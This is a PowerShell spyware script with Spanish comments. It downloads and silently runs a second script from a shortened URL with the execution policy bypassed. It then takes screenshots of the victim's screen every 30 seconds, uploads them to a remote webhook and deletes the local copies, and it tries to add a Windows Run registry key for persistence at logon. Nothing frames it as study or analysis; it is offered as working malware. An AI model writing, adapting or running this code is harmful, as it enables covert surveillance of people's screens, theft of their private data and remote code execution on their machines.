# URL del webhook
$hookurl = "https://bit.ly/web_chupacabras"
$seconds = 30 # Intervalo entre capturas de pantalla
$a = 2 # Cantidad de capturas de pantalla por iteración

# Función para descargar y ejecutar el script principal
function DescargarYExecutarScriptPrincipal {
    $scriptUrl = "https://bit.ly/Screen_dc"
    $scriptPath = "$env:temp\script.ps1"
    if (-not (Test-Path $scriptPath)) {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
    }
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
}

# Verificar si el script principal existe y ejecutarlo
DescargarYExecutarScriptPrincipal

# Iniciar bucle de captura y envío de imágenes
While ($true){
    For ($i = 0; $i -lt $a; $i++){
        $Filett = "$env:temp\SC_$i.png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Width = $Screen.Width
        $Height = $Screen.Height
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    For ($i = 0; $i -lt $a; $i++){
        $fileToSend = "$env:temp\SC_$i.png"
        $fileName = "SC_$i.png"
        $webClient = New-Object System.Net.WebClient
        $webClient.UploadFile($hookurl, $fileToSend)
        Remove-Item -Path $fileToSend -Force
    }
    Start-Sleep $seconds
}

# Agregar entrada al Registro de Windows para ejecutar al iniciar sesión
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "MyScript"
if (-not (Get-ItemProperty -Path $registryPath -Name $scriptName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $registryPath -Name $scriptName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
}
